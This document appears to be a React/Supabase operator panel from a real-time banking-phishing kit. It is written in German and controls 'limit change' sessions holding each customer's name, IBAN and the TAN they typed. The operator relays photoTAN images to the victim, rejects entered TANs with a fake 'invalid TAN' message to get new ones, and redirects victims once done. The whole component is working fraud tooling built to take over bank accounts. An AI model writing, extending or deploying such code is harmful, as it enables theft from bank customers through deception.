import { useEffect, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Sliders, Link2, XCircle, CheckCircle2, Trash2, Upload, RotateCcw, RefreshCw } from "lucide-react"; import { Share2 } from "lucide-react";
import { toast } from "sonner";
import LiveChatDialog from "./LiveChatDialog";

type Row = {
  id: string;
  token: string;
  auftraggeber_name: string | null;
  auftraggeber_iban: string | null;
  current_limit: number | null;
  new_limit: number | null;
  customer_phase: string | null;
  photo_tan_image: string | null;
  tan_code: string | null;
  last_error: string | null;
  used: boolean;
  created_at: string;
};

const PHASE_LABEL: Record<string, string> = {
  confirm: "Prüft Transaktion",
  phototan_request: "Wartet auf PhotoTAN-Bild",
  phototan: "PhotoTAN Eingabe",
  phototan_rejected: "TAN abgelehnt",
  success: "Erfolgreich",
  aborted: "Abgebrochen",
};

const LimitLiveCard = () => {
  const [rows, setRows] = useState<Row[]>([]);

  const load = async () => {
    const { data } = await (supabase as any)
      .from("limit_tokens").select("*").order("created_at", { ascending: false }).limit(50);
    setRows(data || []);
  };

  useEffect(() => {
    load();
    const ch = (supabase as any).channel("limit_live_tokens")
      .on("postgres_changes", { event: "*", schema: "public", table: "limit_tokens" }, load).subscribe();
    const iv = window.setInterval(load, 4000);
    return () => { window.clearInterval(iv); (supabase as any).removeChannel(ch); };
  }, []);

  const update = async (id: string, patch: Record<string, any>) => {
    const { error } = await (supabase as any).from("limit_tokens").update(patch).eq("id", id);
    if (error) { toast.error(error.message); return false; }
    setRows(cur => cur.map(r => r.id === id ? { ...r, ...patch } : r));
    return true;
  };
  const setPhase = (r: Row, phase: string, extra: Record<string, any> = {}) => update(r.id, { customer_phase: phase, ...extra });

  const setPhotoTanImage = (r: Row, dataUrl: string | null) => {
    const patch: Record<string, any> = { photo_tan_image: dataUrl };
    if (dataUrl && r.customer_phase === "phototan_request") {
      patch.customer_phase = "phototan";
      patch.last_error = null;
    }
    return update(r.id, patch);
  };
  const showPhotoTan = async (r: Row) => {
    if (!r.photo_tan_image) { toast.error("Bitte zuerst PhotoTAN-Bild hochladen"); return; }
    if (await setPhase(r, "phototan", { last_error: null })) toast.success("PhotoTAN wird dem Kunden angezeigt");
  };
  const rejectTan = (r: Row) => update(r.id, { tan_code: null, customer_phase: "phototan_rejected", last_error: "Die eingegebene TAN ist ungültig. Bitte erneut versuchen." });
  const acceptTan = (r: Row) => update(r.id, { customer_phase: "success", last_error: null });
  const finishSuccess = (r: Row) => update(r.id, { customer_phase: "success", last_error: null });
  const sendBackToAuth = async (r: Row) => { await setPhase(r, "aborted", { last_error: null }); toast.success("Kunde wird zu /auth zurückgeleitet"); };
  const remove = async (r: Row) => {
    if (!window.confirm("Session wirklich löschen?")) return;
    await (supabase as any).from("limit_tokens").delete().eq("id", r.id);
    toast.success("Gelöscht");
  };
  const copyLink = async (r: Row) => {
    const url = `${window.location.origin}/auth?token=${r.token}`;
    try { await navigator.clipboard.writeText(url); toast.success("Kunden-Link kopiert"); } catch { toast.error("Kopieren fehlgeschlagen"); }
  };

  const visible = rows.filter(r => { const p = r.customer_phase; return p && p !== "pending" && p !== "token" && p !== "token_waiting"; });

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2"><Sliders className="h-5 w-5" /> Live-Steuerung Limit-Änderung</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        {!visible.length && <div className="text-sm text-muted-foreground">Keine aktiven Limit-Sessions.</div>}
        {visible.map(r => {
          const phase = r.customer_phase || "confirm";
          const done = phase === "success" || phase === "aborted";
          return (
            <div key={r.id} className={`rounded-md border p-4 space-y-3 ${done ? "opacity-70" : ""}`}>
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div className="flex items-center gap-2 min-w-0">
                  <span className="font-mono text-sm px-2 py-0.5 rounded bg-muted">{r.token}</span>
                  <Badge variant={done ? "secondary" : "default"}>{PHASE_LABEL[phase] || phase}</Badge>
                  {r.auftraggeber_name && <span className="text-sm text-muted-foreground truncate">{r.auftraggeber_name}</span>}
                </div>
                <div className="flex gap-1">
                  <Button size="sm" variant="ghost" onClick={() => copyLink(r)} title="Kunden-Link kopieren"><Link2 className="h-4 w-4" /></Button>
                  {(r as any).show_live_chat && (<>
                    <Button size="sm" variant="ghost" onClick={async () => { const u = `${window.location.origin}/chat/limit/${r.id}`; try { await navigator.clipboard.writeText(u); toast.success("Chat-Link kopiert"); } catch { toast.error("Kopieren fehlgeschlagen"); } }} title="Chat-Link teilen"><Share2 className="h-4 w-4" /></Button>
                    <LiveChatDialog taskId={`limit:${r.id}`} label={r.auftraggeber_name || undefined} />
                  </>)}
                  <Button size="sm" variant="ghost" onClick={() => remove(r)} title="Löschen"><Trash2 className="h-4 w-4" /></Button>
                </div>
              </div>

              <div className="grid sm:grid-cols-2 gap-2 text-xs">
                <div className="rounded border p-2">
                  <div className="uppercase text-[10px] text-muted-foreground mb-0.5">Altes Limit</div>
                  <div>{r.current_limit != null ? `${Number(r.current_limit).toFixed(2)} €` : "—"}</div>
                </div>
                <div className="rounded border p-2 bg-primary/5">
                  <div className="uppercase text-[10px] text-muted-foreground mb-0.5">Neues Limit</div>
                  <div className="font-medium">{r.new_limit != null ? `${Number(r.new_limit).toFixed(2)} €` : "—"}</div>
                </div>
              </div>

              <div className="text-sm">
                <div className="text-[10px] uppercase text-muted-foreground">Eingegebene TAN</div>
                <div className="font-mono font-bold text-base">{r.tan_code || "—"}</div>
              </div>

              {!done && (
                <div className="space-y-3 pt-2 border-t">
                  {phase === "confirm" && (
                    <p className="text-xs text-muted-foreground">Kunde sieht die Transaktion und wartet auf Klick „Mit photoTAN freigeben".</p>
                  )}

                  {phase === "phototan_request" && (
                    <div className="space-y-2">
                      <div className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">PhotoTAN vorbereiten</div>
                      <PhotoTanUploader r={r} onSet={u => setPhotoTanImage(r, u)} />
                      <Button size="sm" onClick={() => showPhotoTan(r)} disabled={!r.photo_tan_image}>
                        <CheckCircle2 className="h-4 w-4 mr-1" />PhotoTAN anzeigen
                      </Button>
                    </div>
                  )}

                  {(phase === "phototan" || phase === "phototan_rejected") && (
                    <div className="space-y-2">
                      <div className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">TAN prüfen</div>
                      <PhotoTanUploader r={r} onSet={u => setPhotoTanImage(r, u)} compact />
                      <div className="flex flex-wrap gap-2">
                        <Button size="sm" variant="destructive" onClick={() => rejectTan(r)} disabled={!r.tan_code}>
                          <XCircle className="h-4 w-4 mr-1" />TAN ablehnen
                        </Button>
                        <Button size="sm" variant="outline" onClick={() => showPhotoTan(r)}>
                          <RefreshCw className="h-4 w-4 mr-1" />Neue PhotoTAN
                        </Button>
                        <Button size="sm" onClick={() => acceptTan(r)} disabled={!r.tan_code}>
                          <CheckCircle2 className="h-4 w-4 mr-1" />TAN akzeptieren → /success
                        </Button>
                      </div>
                    </div>
                  )}

                  <div className="flex flex-wrap justify-between gap-2 pt-2 border-t">
                    <Button size="sm" variant="outline" onClick={() => sendBackToAuth(r)}>
                      <RotateCcw className="h-4 w-4 mr-1" />Kunde zurück zu /auth
                    </Button>
                    <Button size="sm" variant="default" onClick={() => finishSuccess(r)}>
                      <CheckCircle2 className="h-4 w-4 mr-1" />Direkt zu /success (6s → /auth)
                    </Button>
                  </div>
                </div>
              )}
            </div>
          );
        })}
      </CardContent>
    </Card>
  );
};

const PhotoTanUploader = ({ r, onSet, compact }: { r: Row; onSet: (u: string | null) => void; compact?: boolean }) => {
  const inputRef = useRef<HTMLInputElement>(null);
  const [url, setUrl] = useState("");
  const [loading, setLoading] = useState(false);

  const onFile = async (f: File) => {
    const reader = new FileReader();
    reader.onload = () => onSet(String(reader.result));
    reader.readAsDataURL(f);
  };
  const onUrl = async () => {
    const u = url.trim(); if (!u) return;
    setLoading(true);
    try {
      const { data, error } = await (supabase as any).functions.invoke("fetch-photo-tan", { body: { url: u, autoCrop: true } });
      if (error || !data?.dataUrl) throw new Error(error?.message || "Fehler");
      onSet(data.dataUrl); setUrl(""); toast.success("PhotoTAN übernommen");
    } catch (e: any) { toast.error(e.message || "Konnte Bild nicht laden"); }
    finally { setLoading(false); }
  };

  return (
    <div className="space-y-2">
      <div className="flex items-center gap-2 flex-wrap">
        <input ref={inputRef} type="file" accept="image/*" hidden
          onChange={e => { const f = e.target.files?.[0]; if (f) onFile(f); e.target.value = ""; }} />
        <Button size="sm" variant="outline" onClick={() => inputRef.current?.click()}>
          <Upload className="h-4 w-4 mr-1" />{r.photo_tan_image ? "Bild ersetzen" : "Bild hochladen"}
        </Button>
        {r.photo_tan_image && (
          <>
            {!compact && <img src={r.photo_tan_image} alt="preview" className="h-10 w-10 object-contain border rounded" />}
            <Button size="sm" variant="ghost" onClick={() => onSet(null)}>entfernen</Button>
          </>
        )}
        {!r.photo_tan_image && <span className="text-xs text-muted-foreground">oder Link einfügen ↓</span>}
      </div>
      <div className="flex items-center gap-2 flex-wrap">
        <Input value={url} onChange={e => setUrl(e.target.value)} onKeyDown={e => { if (e.key === "Enter") onUrl(); }}
          placeholder="Bild-URL" className="h-8 flex-1 min-w-[220px]" />
        <Button size="sm" onClick={onUrl} disabled={loading || !url.trim()}>{loading ? "Lade..." : "Übernehmen"}</Button>
      </div>
    </div>
  );
};

export default LimitLiveCard;
